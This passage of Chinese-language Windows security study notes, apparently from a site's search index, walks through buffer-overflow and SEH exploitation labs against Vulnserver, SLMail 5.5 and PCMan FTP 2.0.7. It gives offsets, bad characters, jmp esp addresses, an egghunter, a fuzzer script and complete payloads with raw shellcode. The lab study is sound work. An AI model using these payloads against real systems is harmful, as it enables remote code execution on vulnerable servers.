\u7531\u4e8e\u6211\u5728146\u4e2a\u5b57\u8282\u540e\u53d1\u9001\u4e864\u4e2a Z \uff0c\u8fd9\u91cc\u7684EIP\u503c\u662f 5A5A5A5A \u67e5\u627e\u574f\u5b57\u7b26 \u4e3a\u4ec0\u4e48\u8981\u67e5\u627e\u574f\u5b57\u7b26? \u8fd9\u662f\u56e0\u4e3a\u6bcf\u4e2a\u7a0b\u5e8f\u7684\u8f93\u5165\u70b9\u5224\u65ad\u4e0d\u4e00\u6837\uff0c\u6bd4\u5982\u6709\u7684\u8f93\u5165\u70b9\u53ea\u5141\u8bb8\u8f93\u5165\u6570\u5b57\uff0c\u6709\u7684\u7a0b\u5e8f\u4e0d\u5141\u8bb8\u8f93\u5165\u5b57\u7b26\u3002\u9700\u8981\u627e\u5230\u8fd9\u4e9b\u7a0b\u5e8f\u4e0d\u6b63\u5e38\u5904\u7406\u7684\u574f\u5b57\u7b26\uff0c\u7528\u8fd9\u4e9b\u574f\u5b57\u7b26\u4e4b\u5916\u7684\u5b57\u7b26\u6765\u751f\u6210shellcode\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u7a0b\u5e8f\u56e0\u4e3a\u5f02\u5e38\u800c\u7ec8\u6b62\u3002 \u5728EIP\u4e4b\u540e\u53d1\u9001\u6240\u6709\u5b57\u7b26\u6765\u6d4b\u8bd5\u574f\u5b57\u7b26 \u57280x09\u540e\u76840x0a\u53d8\u6210\u4e860x00\uff0c0x0a\u662f\u4e00\u4e2a\u574f\u5b57\u7b26\u3002 \u53bb\u63890x0a\u540e\u91cd\u65b0\u53d1\u9001\uff0c\u5faa\u73af\u6b64\u6b65\u9aa4\u4ee5\u627e\u5230\u6240\u6709\u7684\u574f\u5b57\u7b26 \u91cd\u5b9a\u5411\u6267\u884c\u6d41 \u8fd9\u662fshellcode\u88ab\u6267\u884c\u7684\u5173\u952e\u4e00\u6b65\u3002 \u627e\u5230\u7a0b\u5e8f\u4e2d\u5b58\u5728\u7684 jmp esp \u6216\u8005 call esp \u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u8df3\u5230esp\u7684\u4f4d\u7f6e\u91cd\u65b0\u6267\u884c\uff0c\u4ee5\u4fbf\u8ba9shellcode\u88ab\u6267\u884c \u901a\u8fc7\u5339\u914d\u7279\u5f81\u627e\u5230\u4e864\u4e2a jmp esp \u5730\u5740\u5206\u522b\u662f f7552677 85102177 c3c12177 f2131f77 \u5c06 EIP \u7684\u503c\u66ff\u6362\u4e3a f7552677 \u4fbf\u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u91cd\u65b0\u6267\u884cESP\u5730\u5740\u7684\u4ee3\u7801 \u63a5\u7740\u9700\u8981\u5728 jmp esp \u540e\u9762\u63d2\u5165 nop \uff0c\u786e\u4fddjmp\u4e4b\u540e\u4f1a\u6267\u884c\u5230shellcode \u751f\u6210shellcode \u8981\u6ce8\u610f\u7684 shellcode\u4e0d\u80fd\u6709\u574f\u5b57\u7b26 shellcode\u9000\u51fa\u7ebf\u7a0b,\u4e0d\u80fd\u9000\u51fa\u8fdb\u7a0b \u4f7f\u7528msf\u751f\u6210shellcode generate EXITFUNC=thread -b \"\\x00\\x0a\" \u6b64\u65f6\u5b8c\u6574payload\u662f 146\u5b57\u8282\u968f\u673a\u5b57\u7b26 + 0xf7552677 + 8\u5b57\u8282nop + shellcode","title":"\u7ec3\u4e60A"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#b","text":"\u7a0b\u5e8f\u8fd0\u884c\u540e\u7684\u6837\u5b50 C:\\>nc 192.168.14.139 9999 Welcome to Vulnerable Server! Enter HELP for help. HELP Valid Commands: HELP STATS [stat_value] RTIME [rtime_value] LTIME [ltime_value] SRUN [srun_value] TRUN [trun_value] GMON [gmon_value] GDOG [gdog_value] KSTET [kstet_value] GTER [gter_value] HTER [hter_value] LTER [lter_value] KSTAN [lstan_value] EXIT \u67d0\u4e2a\u547d\u4ee4\u7684\u67d0\u4e9b\u5b57\u7b26\u4e32\u4f1a\u5bfc\u81f4\u7f13\u5b58\u6ea2\u51fa TRUN \u547d\u4ee4\u540e\u8ddf /. \uff0c\u4e4b\u540e\u7684\u5b57\u7b26\u4e32\u5230\u4e00\u5b9a\u6570\u91cf\u540e\u4f1a\u89e6\u53d1\u6ea2\u51fa GMON\u4e5f\u5b58\u5728\u76f8\u540c\u95ee\u9898,\u6ea2\u51fa\u5230EBP,\u6ea2\u51fa\u4e0d\u5230EIP KSTET\u4e5f\u5b58\u5728\u6ea2\u51fa,\u53ef\u8986\u76d6EIP,\u8986\u76d6\u4e0d\u4e86\u6808 GTER\u4e5f\u5b58\u5728\u6ea2\u51fa,\u53ef\u6ea2\u51fa\u5230EIP.\u4f46\u6d4b\u8bd5\u4e4b\u540e\u53d1\u73b0\u6ea2\u51fa\u540e\u7684\u53ef\u63a7\u7a7a\u95f4\u4e0d\u8db3 \u8fd8\u662f\u7528TRUN\u6d4b\u8bd5 \u6d4b\u8bd5EIP\u504f\u79fb\u91cf \u6d4b\u8bd5\u574f\u5b57\u7b26,\u6ca1\u6709\u53d1\u73b00x00\u5916\u7684\u574f\u5b57\u7b26 \u6700\u7ec8\u7684payload\u662f eip = \"\\xaf\\x11\\x50\\x62\" nop = \"\\x90\" * 20 all = b\"TRUN /./Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Caaabb\" + eip + nop + buf","title":"\u7ec3\u4e60B"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#c","text":"\u7a0b\u5e8f: slmail 5.5\u7248\u672c\u7f13\u51b2\u533a\u6ea2\u51fa POP3\u534f\u8bae\u8fde\u63a5\uff0cPASS\u547d\u4ee4\u540e\u8f93\u5165\u70b9\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e \u6839\u636e\u4f5c\u8005payload\u53ef\u5f97\u77e5,\u5728PASS\u547d\u4ee4\u540e\u63d2\u51652606\u4e2a\u574f\u5b57\u7b26\u5b57\u7b26\u53ef\u5bfc\u81f4\u6ea2\u51fa,EIP\u504f\u79fb\u91cf\u5c31\u57282606,\u4e4b\u540e\u7684\u6570\u636e\u4f1a\u6ea2\u51fa\u5230ESP. \u5982\u56feEIP\u7684\u503c\u88ab\u8986\u76d6\u4e3aAAAA \u627e\u5230 jmp esp \u5730\u5740\u5e76\u5c06EIP\u7684\u503c\u6ea2\u51fa\u4e3a\u8be5\u503c\uff0c\u7a0b\u5e8f\u6b63\u786e\u8df3\u5230\u4e86\u8fd9\u4e2a\u5730\u65b9 \u63a5\u7740\u6d4b\u8bd5\u574f\u5b57\u7b26 \u7ecf\u6d4b\u8bd5,\u574f\u5b57\u7b26\u4e3a \\x00\\x0a\\x0b\\x0d \uff0c\u6392\u9664\u574f\u5b57\u7b26\u751f\u6210shellcode\uff0c\u53d1\u9001","title":"\u7ec3\u4e60C"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#d","text":"\u8f6f\u4ef6\uff1aPCMAN 2.0.7\u7248\u672c 21\u7aef\u53e3\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e \u63a5\u7740\u6d4b\u8bd5 \u5f8021\u7aef\u53e3\u53d1\u9001\u6570\u636e\u53ef\u4ee5\u770b\u5230\u88ab\u670d\u52a1\u5668\u63a5\u6536\u4e14\u56de\u663e\u5728\u65e5\u5fd7\u680f boofuzz\u8dd1\u4e00\u4e0b\uff0c\u7a0b\u5e8f\u5728\u6b64\u5904crash\u4e86 boofuzz\u811a\u672c\u53d1\u4e8610000\u5b57\u8282\u6570\u636e\u4ea7\u751f\u4e86crash\uff0c\u4f7f\u7528\u81ea\u5b9a\u4e49\u6570\u636e\u6d4b\u8bd5\u4e00\u4e0b\u6ea2\u51fa\u70b9 \u8fd9\u6b21\u53d1\u9001\u4e865000\u5b57\u8282\u4e5fcrash \u2514\u2500# msf-pattern_offset -q 43396F43 [*] Exact match at offset 2007 EIP\u504f\u79fb\u91cf2007 \u574f\u5b57\u7b26 \\x00\\x0a\\x0d \u5b8c\u6574payload eip = \"\\x01\\x90\\xd9\\x73\" nop = \"\\x90\" * 16 buf = b\"\" buf += b\"\\xdb\\xd7\\xd9\\x74\\x24\\xf4\\xb8\\x88\\x11\\x6c\\xc8\\x5a\\x2b\" buf += b\"\\xc9\\xb1\\x32\\x31\\x42\\x17\\x03\\x42\\x17\\x83\\x4a\\x15\\x8e\" buf += b\"\\x3d\\xb6\\xfe\\xcc\\xbe\\x46\\xff\\xb0\\x37\\xa3\\xce\\xf0\\x2c\" buf += b\"\\xa0\\x61\\xc1\\x27\\xe4\\x8d\\xaa\\x6a\\x1c\\x05\\xde\\xa2\\x13\" buf += b\"\\xae\\x55\\x95\\x1a\\x2f\\xc5\\xe5\\x3d\\xb3\\x14\\x3a\\x9d\\x8a\" buf += b\"\\xd6\\x4f\\xdc\\xcb\\x0b\\xbd\\x8c\\x84\\x40\\x10\\x20\\xa0\\x1d\" buf += b\"\\xa9\\xcb\\xfa\\xb0\\xa9\\x28\\x4a\\xb2\\x98\\xff\\xc0\\xed\\x3a\" buf += b\"\\xfe\\x05\\x86\\x72\\x18\\x49\\xa3\\xcd\\x93\\xb9\\x5f\\xcc\\x75\" buf += b\"\\xf0\\xa0\\x63\\xb8\\x3c\\x53\\x7d\\xfd\\xfb\\x8c\\x08\\xf7\\xff\" buf += b\"\\x31\\x0b\\xcc\\x82\\xed\\x9e\\xd6\\x25\\x65\\x38\\x32\\xd7\\xaa\" buf += b\"\\xdf\\xb1\\xdb\\x07\\xab\\x9d\\xff\\x96\\x78\\x96\\x04\\x12\\x7f\" buf += b\"\\x78\\x8d\\x60\\xa4\\x5c\\xd5\\x33\\xc5\\xc5\\xb3\\x92\\xfa\\x15\" buf += b\"\\x1c\\x4a\\x5f\\x5e\\xb1\\x9f\\xd2\\x3d\\xdc\\x5e\\x60\\x38\\x92\" buf += b\"\\x61\\x7a\\x42\\x83\\x09\\x4b\\xc9\\x4c\\x4d\\x54\\x18\\x29\\xb1\" buf += b\"\\xb6\\x88\\x44\\x5a\\x6f\\x59\\xe5\\x07\\x90\\xb4\\x2a\\x3e\\x13\" buf += b\"\\x3c\\xd3\\xc5\\x0b\\x35\\xd6\\x82\\x8b\\xa6\\xaa\\x9b\\x79\\xc8\" buf += b\"\\x19\\x9b\\xab\\xa6\\xf2\\x17\\x31\\x46\\x6c\\xbc\\x97\\xc3\\x16\" buf += b\"\\x59\\xe8\" all = \"\\x90\" * 2007 all += eip all += nop all += buf","title":"\u7ec3\u4e60D"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#eseh","text":"\u91cd\u505avulserver.exe https://zflemingg1.gitbook.io/undergrad-tutorials/walkthroughs-osce/vulnserver-gmon-command GMON\u547d\u4ee4\u53ef\u6ea2\u51fa\uff0c\u65e0\u6cd5\u4fee\u6539EIP\uff0c\u4f46\u662f\u53ef\u4ee5\u6ea2\u51fa\u5230SEH SEH\u4e24\u6761\u504f\u79fb\u91cf \u2514\u2500# msf-pattern_offset -q 6F45346F [*] Exact match at offset 3553 \u250c\u2500\u2500(root\ud83d\udc80kali)-[~] \u2514\u2500# msf-pattern_offset -q 45336f45 [*] Exact match at offset 3549 \u53ef\u4ee5\u63a7\u5236SEH\u4e86 \u4e0e\u666e\u901a\u627e\u5230 jmp esp \u7684\u65b9\u5f0f\u4e0d\u540c\u7684\u662f\uff0cSEH\u6ea2\u51fa\u5229\u7528\u9700\u8981\u627e\u5230\u4e00\u5904pop/pop/ret\u6307\u4ee4\u7ec4\u3002\u8fd9\u662f\u56e0\u4e3aSEH\u5728\u88ab\u8c03\u7528\u65f6\u4f1a\u5728\u6808\u4e0a\u538b\u5165\u6570\u4e2a\u53c2\u6570\uff0c\u4e24\u6b21pop\u6307\u4ee4\u53ef\u4ee5\u8ba9ESP\u2014\u2014\u6808\u9876\u7684\u4f4d\u7f6e\u5f80\u9ad8\u4f4d\u5904\u79fb\u52a88\u5b57\u8282(32\u4f4d\u7a0b\u5e8f\u4e2d\u4e24\u6b21pop\u5bc4\u5b58\u5668\uff0c\u5bc4\u5b58\u5668\u5927\u5c0f\u662f4\u5b57\u8282)\u3002\u5f53ESP\u51cf\u5c0f8\u5b57\u8282\u540e\u518d\u4f7f\u7528RET\u6b63\u597d\u53ef\u4ee5\u6267\u884cESP\u4e2d\u88ab\u63a7\u5236\u7684SEH\u6210\u5458\u5730\u5740\u3002 \u5730\u5740\u4e3a 625010b4 \u5c06SEH\u7684\u5730\u5740\u8986\u76d6\u4e3a 625010b4 \uff0c\u7a0b\u5e8f\u6210\u529f\u6267\u884c\u5230\u4e86\u8be5\u5904 \u4e3a\u6b64\u9700\u8981\u53d1\u9001\u7684payload\u683c\u5f0f\u4e3a SEH\u6ea2\u51fa\u504f\u79fb\u91cf + NSEH + SEH + \u586b\u5145\u7b26 NSEH\u662f\u5728SEH\u6267\u884c\u540e\u8c03\u7528\u7684\u6307\u4ee4\u3002 \u7a0b\u5e8f\u4ea7\u751f\u5f02\u5e38\u540e\u4f1a\u5148\u8c03\u7528SEH\u5730\u5740\u7684\u6307\u4ee4\uff0c\u6b64\u65f6SEH\u5730\u5740\u88ab\u8986\u76d6\u4e3a\u4e862\u4e2apop 1\u4e2aret\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u76f4\u63a5\u6267\u884cNSEH\u5730\u5740\u7684\u6307\u4ee4\uff0cNSEH\u7684\u6307\u4ee4\u6307\u5f15\u81ea\u5b9a\u4e49\u77ed\u8df3\u6307\u4ee4\u8df3\u5165shellcode\u533a\u3002 2\u6b21pop\u540eret\u8fd4\u56de\u5230\u4e86SEH\u7684\u5c0f\u7f13\u51b2\u533a \u867d\u7136\u53ef\u4ee5\u4f7f\u7528\u77ed\u8df3\u8df3\u5165\u4e0b\u9762\u7684\u53ef\u63a7\u533a\u57df\uff0c\u4f46\u662f\u4e0b\u9762\u7684\u533a\u57df\u6ca1\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u8ba9\u5165shellcode\u3002 \u7531\u4e8e\u4e0d\u80fd\u5f80\u540e\u8df3\uff0c\u90a3\u5c31\u5f80\u56de\u8df3\uff0c\u524d\u9762\u7684\u7a7a\u95f4\u4e5f\u662f\u53ef\u63a7\u7684 \u4f46\u662f\u77ed\u8df3\u7684\u8ddd\u79bb\u662f\u6709\u9650\u7684\uff0c\u65e0\u6cd5\u8df3\u8dc3\u6574\u4e2ashellcode\u3002\u6b64\u65f6\u53ef\u4ee5\u91c7\u7528\u5148\u77ed\u8df3\u81f3egghunter\u6307\u4ee4\uff0cegghunter\u5728\u524d\u9762\u7684\u66f4\u5927\u7684\u7f13\u51b2\u533a\u4e2d\u67e5\u627eegg\u6807\u8bb0\uff0c\u5728egg\u6807\u8bb0\u540e\u653e\u7f6eshellcode\u6765\u6267\u884cshellcode \u6574\u4e2apayload\u5982\u4e0b //egghunter\u4ee3\u7801 egghunter=b\"\" egghunter+=b\"\\x33\\xd2\\x66\\x81\\xca\\xff\\x0f\\x33\\xdb\\x42\\x53\\x53\\x52\\x53\\x53\\x53\" egghunter+=b\"\\x6a\\x29\\x58\\xb3\\xc0\\x64\\xff\\x13\\x83\\xc4\\x0c\\x5a\\x83\\xc4\\x08\\x3c\" egghunter+=b\"\\x05\\x74\\xdf\\xb8\\x50\\x57\\x4e\\x44\\x8b\\xfa\\xaf\\x75\\xda\\xaf\\x75\\xd7\" egghunter+=b\"\\xff\\xe7\" //\u6267\u884cnotepad\u7684shellcode buf = b\"\" buf += b\"\\xda\\xc0\\xd9\\x74\\x24\\xf4\\xbb\\x74\\x96\\x27\\xf3\\x5d\\x2b\" buf += b\"\\xc9\\xb1\\x32\\x31\\x5d\\x17\\x83\\xc5\\x04\\x03\\x29\\x85\\xc5\" buf += b\"\\x06\\x2d\\x41\\x8b\\xe9\\xcd\\x92\\xec\\x60\\x28\\xa3\\x2c\\x16\" buf += b\"\\x39\\x94\\x9c\\x5c\\x6f\\x19\\x56\\x30\\x9b\\xaa\\x1a\\x9d\\xac\" buf += b\"\\x1b\\x90\\xfb\\x83\\x9c\\x89\\x38\\x82\\x1e\\xd0\\x6c\\x64\\x1e\" buf += b\"\\x1b\\x61\\x65\\x67\\x46\\x88\\x37\\x30\\x0c\\x3f\\xa7\\x35\\x58\" buf += b\"\\xfc\\x4c\\x05\\x4c\\x84\\xb1\\xde\\x6f\\xa5\\x64\\x54\\x36\\x65\" buf += b\"\\x87\\xb9\\x42\\x2c\\x9f\\xde\\x6f\\xe6\\x14\\x14\\x1b\\xf9\\xfc\" buf += b\"\\x64\\xe4\\x56\\xc1\\x48\\x17\\xa6\\x06\\x6e\\xc8\\xdd\\x7e\\x8c\" buf += b\"\\x75\\xe6\\x45\\xee\\xa1\\x63\\x5d\\x48\\x21\\xd3\\xb9\\x68\\xe6\" buf += b\"\\x82\\x4a\\x66\\x43\\xc0\\x14\\x6b\\x52\\x05\\x2f\\x97\\xdf\\xa8\" buf += b\"\\xff\\x11\\x9b\\x8e\\xdb\\x7a\\x7f\\xae\\x7a\\x27\\x2e\\xcf\\x9c\" buf += b\"\\x88\\x8f\\x75\\xd7\\x25\\xdb\\x07\\xba\\x23\\x1a\\x95\\xc1\\x06\" buf += b\"\\x1c\\xa5\\xc9\\x36\\x75\\x94\\x42\\xd9\\x02\\x29\\x81\\x9d\\xed\" buf += b\"\\xcb\\x03\\xe8\\x85\\x55\\xc6\\x51\\xc8\\x65\\x3d\\x95\\xf5\\xe5\" buf += b\"\\xb7\\x66\\x02\\xf5\\xb2\\x63\\x4e\\xb1\\x2f\\x1e\\xdf\\x54\\x4f\" buf += b\"\\x8d\\xe0\\x7c\\x21\\x5e\\x6b\\x1a\\xcd\\xc1\\xf7\\xca\\x48\\x7a\" buf += b\"\\x9d\\x12\" all = b\"GMON /.\" //\u9020\u6210\u6ea2\u51fa\u7684\u5b57\u7b26 all += \"A\" * 8 //\u5360\u4f4d\uff0c\u4e0e\u6709\u6548\u6570\u636e\u5206\u5f00 all += b\"PWNDPWND\" + buf //egg\u6807\u5fd7\u540e\u9762\u8ddfshellcode all += \"\\x90\" * (3556 - 50 -len(all)) //\u51cf\u53bbegg\u6807\u5fd7\u3001shellcode\u3001egghunter\u4ee3\u7801\u540e\u7684\u586b\u5145 all += egghunter //egghunter\u586b\u5145\u5b57\u7b26\uff0c\u653e\u5728\u8fd9\u91cc\u4fbf\u4e8e\u88ab\u77ed\u8df3\u5230 all += \"\\x90\" * (3556 - len(all)) //\u5269\u4f59\u7684\u586b\u5145\u5b57\u7b26 all += \"\\xeb\\xbc\\x90\\x90\" //nseh\uff0c\u8fd9\u662f\u4e00\u4e2a\u77ed\u8df3\u6307\u4ee4 all += \"\\xb4\\x10\\x50\\x62\" //\u6307\u5411pop pop ret\u6307\u4ee4\u7684\u5730\u5740\uff0c\u4fbf\u4e8e\u6267\u884cnseh\u4e2d\u5730\u5740 all += \"\\x90\" * 1000 //\u586b\u5145\u7b26 s.send(all)","title":"\u7ec3\u4e60E(SEH)"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#f","text":"vulserver\u7684HTER\u547d\u4ee4\u7ec3\u4e60 \u6808\u6ea2\u51faEIP\u8986\u76d6\uff0c\u76f4\u63a5\u4f7f\u7528\u666e\u901a\u5b57\u7b26\u53ef\u4ee5\u9020\u6210\u6ea2\u51fa\u3002\u4f46\u662f\u6ea2\u51fa\u5b57\u7b26\u88ab\u76f4\u63a5\u5199\u5165\u4e86\u5185\u5b58\u3002 msf\u751f\u6210\u7684\u5b57\u7b26\u5728\u8fd9\u79cd\u73af\u5883\u65e0\u6cd5\u4f7f\u7528\uff0c\u6240\u4ee5\u5b57\u7b26\u90fd\u4ee516\u8fdb\u5236\u5199\u5165\u5185\u5b58\uff0c\u6d4b\u8bd5\u6ca1\u529e\u6cd5\u9020\u6210\u6ea2\u51fa\u3002 \u4f7f\u7528\u811a\u672c\u4e00\u4e2a\u4e2a\u53d1\u9001\u5b57\u7b26\uff0c\u53cd\u590d\u6d4b\u8bd5\uff0c\u6700\u7ec8\u6ea2\u51fa\u70b9\u5728 HTER \u76842041\u5b57\u7b26\u540e import socket import sys ip = \"192.168.14.139\" port = 9999 string = \"HTER \" s = socket.socket() s.connect((ip, port)) timeout = 3 s.settimeout(timeout) while True: try: print(\"Fuzzing with {} bytes\".format(len(string))) s.send(string + b\"\\x0a\\x0d\") string += b\"A\" * 1 s.recv(1024) except: print(\"Fuzzer crashed at {} bytes\".format(len(string))) sys.exit(0) s.close() \u7528mona\u63d2\u4ef6\u627e\u5230 jmp esp \u7684\u5730\u5740\u3002 [+] Command used: !mona jmp -r esp ---------- Mona command started on 2023-10-16 15:15:42 (v2.0, rev 577) ---------- [+] Processing arguments and criteria - Pointer access level : X [+] Generating module info table, hang on... - Processing modules - Done. Let's rock 'n roll. [+] Querying 2 modules - Querying module essfunc.dll - Querying module vulnserver.exe - Search complete, processing results [+] Preparing output file 'jmp.txt' - (Re)setting logfile jmp.txt [+] Writing results to jmp.txt - Number of pointers of type 'jmp esp' : 9 [+] Results : 0x625011af | 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x625011bb | 0x625011bb : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x625011c7 | 0x625011c7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x625011d3 | 0x625011d3 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x625011df | 0x625011df : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x625011eb | 0x625011eb : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x625011f7 | 0x625011f7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x62501203 | 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) 0x62501205 | 0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) \u540e\u9762\u5c31\u662f\u5e38\u89c4\u7684\u627e\u574f\u5b57\u7b26\u3001\u751f\u6210shellcode\uff0c\u7136\u540e\u53d1\u9001payload\u3002\u5b8c\u6574payload allaf115062\" + \"90\" * 20 + \"dac0d97424f4bb749627f35d2bc9b132315d1783c504032985c5062d418be9cd92ec6028a32c1639949c5c6f1956309baa1a9dac1b90fb839c8938821ed06c641e1b616567468837300c3fa73558fc4c054c84b1de6fa56454366587b9422c9fde6fe614141bf9fc64e456c14817a6066ec8dd7e8c75e645eea1635d4821d3b968e6824a6643c0146b52052f97dfa8ff119b8edb7a7fae7a272ecf9c888f75d725db07ba231a95c1061ca5c936759442d90229819dedcb03e88555c651c8653d95f5e5b76602f5b2634eb12f1edf544f8de07c215e6b1acdc1f7ca487a9d12\"","title":"\u7ec3\u4e60F"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#g","text":"VulServer\u4e2d\u7684LTER\u547d\u4ee4 ./ \u540e\u8ddf\u591a\u4e2a\u5b57\u7b26\u89e6\u53d1\u6ea2\u51fa\uff0c\u6ea2\u51fa\u5230SEH \u8ba1\u7b97SEH\u548cNSEH\u504f\u79fb\u91cf\uff0c\u4e0a\u9762\u662fSEH\uff0c\u4e0b\u9762\u662fNSEH \u2514\u2500# msf-pattern_offset -q 6f45346f [*] Exact match at offset 3553 \u2514\u2500# msf-pattern_offset -q 45336f45 [*] Exact match at offset 3549 \u6d4b\u8bd5\u8986\u76d6SEH \u6d4b\u8bd5\u574f\u5b57\u7b26\uff0c\u7ed3\u679c\u4e3a \\x80 \u5230 \\xff 